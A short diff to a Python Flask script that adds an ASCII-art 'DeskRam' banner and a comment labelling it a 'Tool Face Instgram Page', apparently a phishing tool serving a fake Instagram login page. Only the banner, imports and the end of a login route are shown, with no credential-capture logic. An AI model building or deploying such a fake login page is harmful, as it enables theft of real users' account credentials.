@@ -1,12 +1,25 @@
-import requests
-import time
+#!/usr/bin/env python
+# """
+#  ______   _______  _______  _        _______  _______  _______ 
+# (  __  \ (  ____ \(  ____ \| \    /\(  ____ )(  ___  )(  ___  )
+# | (  \  )| (    \/| (    \/|  \  / /| (    )|| (   ) || () () |
+# | |   ) || (__    | (_____ |  (_/ / | (____)|| (___) || || || |
+# | |   | ||  __)   (_____  )|   _ (  |     __)|  ___  || |(_)| |
+# | |   ) || (            ) ||  ( \ \ | (\ (   | (   ) || |   | |===>("Ali")
+# | (__/  )| (____/\/\____) ||  /  \ \| ) \ \__| )   ( || )   ( |
+# (______/ (_______/\_______)|_/    \/|/   \__/|/     \||/     \|
+# """         ___                  
+# User --- > <(-_-)> Attcker --> :) 
+# [+] Tool Face Instgram Page! 
+
+import requests, time
 from flask import Flask, request, redirect, render_template
 from user_agent import generate_user_agent
-from flask_cors import CORS
 from pyfiglet import Figlet
 from colorama import Fore
-
+from flask_cors import CORS
 f = Figlet(font='epic')  
+
 print(Fore.BLUE + f.renderText('DeskRam'))
 
 app = Flask(__name__)
@@ -83,5 +96,3 @@ def login_page():
             return render_template('login.html', error="Error occurred while logging in. Please try again later.")
 
     return render_template('login.html', error=None)
-
-
